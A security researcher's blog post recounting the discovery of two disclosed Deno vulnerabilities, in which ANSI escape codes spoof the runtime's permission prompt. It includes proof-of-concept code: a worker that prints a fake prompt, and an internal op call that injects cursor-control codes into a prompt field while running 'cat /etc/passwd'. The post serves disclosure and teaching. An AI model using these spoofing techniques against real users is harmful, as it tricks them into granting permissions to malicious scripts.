---
title: twice-around ansi injection in deno
description: permission prompts are wonderful, but the modern terminal is powerful too.
emojis: 🦕 🚫 📟
date: 2023-03-25
slug: deno-ansi-injection
---

Deno is a wonderful project, and I'm a big fan. I've been following the project for a few years now, and it is one of my favourite scripting runtimes, even more than python.
It's a great way to run TypeScript (and, unfortunately, JavaScript) code on the server side, and its package model + permission system proves extremely powerful.

However, the project for me served as a good start on my first few CVEs.

## Deno's permission system

Deno, by default, is secure. Deno doesn't make guarantees on runtime resources (CPU, RAM), but it does make guarantees on external access or permenant storage.

For example, if a malicious script you ran (maybe `deno run https://example.com/malicious-script.ts`) tried to access the file system, it would be denied. This is because Deno's default permissions don't allow for:
- network access
- file system access
- environment access
- arbitrary command execution
- ffi access
- and even fingerprinting (system apis and disables high resolution timers)

However, sometimes you *want* a script to have these permissions, so deno treats you with a prompt. For example, running `deno run https://example.com/grab-a-cat-pic.ts`, which grabs pictures of cats from an `example.com` API, would prompt you with:

```
┌ ⚠️  Deno requests net access to "example.com".
├ Requested by `fetch()` API
├ Run again with --allow-net to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all net permissions) >
```

This is a wonderful feature, and I'm glad it exists. It makes working with arbitrary scripts much safer, and it's a great way to ensure that you're not running malicious code.
Unfortunately, it's not perfect.

## by accident

I was playing around with Deno's web workers. Web workers allow you to run code in a separate thread,
and they're a great way to do things like offload CPU intensive tasks to a separate thread, or to run code in a separate thread without blocking the main thread.

At the time, I was trying to fetch some data from my main file asynchronously, and wanted to see how well it worked with web workers.

```ts title=worker.ts
console.log("hello from worker");
```

```ts title=main.ts
const worker = new Worker(new URL("worker.ts", import.meta.url).href, {
  type: "module",
});

const request = await fetch("https://example.com/api/cat-pics");
```

```sh
$ deno run --allow-net main.ts
```

This worked great! I was able to fetch data from the internet, and I was able to run code in a separate thread.

However, when running it again, I forgot to include `--allow-net`, leading to this interesting prompt:

```
┌ ⚠️  Deno requests net access to "example.com".
├ Requested by `fetch()` API
├ Run again with --allow-net to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all net permissions) >
hello from worker
```

At first, I didn't think much of it. I simply assumed the web worker was just running after, and the network request took a bit to kick in, and that it was just printing out the message.

However, from my previous work with direct ANSI codes (as I wanted to know how terminal colors were displayed), I knew that you could use ANSI codes to move the cursor around, and I knew that you could use ANSI codes to clear the screen.

So, I decided to try it out.

```ts title=worker.ts
console.clear();
console.log(`
┌ ⚠️  Deno requests net access to "deno.land".
├ Requested by `fetch()` API
├ Run again with --allow-net to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all net permissions) >
`);
```

```ts title=main.ts
const worker = new Worker(new URL("worker.ts", import.meta.url).href, {
  type: "module",
});

const request = await fetch("https://example.com/api/malicious-fetch-fingerprint");
```

```sh
deno run main.ts
```

As predicted, the prompt was cleared, and the message was printed out. This simple trick allowed me to spoof the prompt, and it was a great way to get a user to accidentally grant permissions to a malicious script.

This CVE is now [GHSA-mc52-jpm2-cqh6](https://github.com/denoland/deno/security/advisories/GHSA-mc52-jpm2-cqh6), or [CVE-2023-22499](https://security.snyk.io/vuln/SNYK-RUST-DENO-3233636) (snyk).

## on purpose

Around this time, I recently learned that deno had internal methods (accessible by `Deno[Deno.internal]`).

Then, looking at the permission prompt (from my previous CVE), I noticed that it can take a number of parameters on the rust side, and that it occasionally exposes these parameters to the user.

Here was the template for the permission prompt:

```
┌ ⚠️  Deno requests ${type} access to ${scope}.
├ Requested by `${api}` API
├ Run again with --allow-${type} to bypass this prompt.
└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all net permissions) >
```

`type` and `scope` are both tightly controlled, and are only ever set to a few values. However, `api` is not. It's set to whatever the API is that is requesting the permission.

For ease of developer convenience, the Deno maintainers made this configurable, and allowed you to set the `api` parameter to whatever you wanted, on the TypeScript side.

This was hidden in `op` functionality, specifically in `op_spawn_child` and `op_kill`, where `op_spawn_child` works on `--unstable` and `op_kill` is configured to give access to all run permissions.

```ts
const boldANSI = "\u001b[1m" // bold
const unboldANSI = "\u001b[22m" // unbold

const prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to "echo"${unboldANSI}
├ Requested by \`Deno.Command().output()`

const moveANSIUp = "\u001b[1A" // moves to the start of the line
const clearANSI = "\u001b[2K" // clears the line
const moveANSIStart = "\u001b[1000D" // moves to the start of the line

Deno[Deno.internal].core.ops.op_spawn_child({
    cmd: "cat",
    args: ["/etc/passwd"],
    clearEnv: false,
    env: [],
    stdin: "null",
    stdout: "inherit",
    stderr: "piped"
}, moveANSIUp + clearANSI + moveANSIStart + prompt)
```

Once again, this allowed me to spoof the prompt, providing another way to get a user to accidentally grant permissions to a malicious script.

This is now [GHSA-vq67-rp93-65qf](https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf), or [CVE-2023-28450](https://nvd.nist.gov/vuln/detail/CVE-2023-28450)

## tips

dig into stuff, if it looks interesting, and try it out. You never know what you might find.
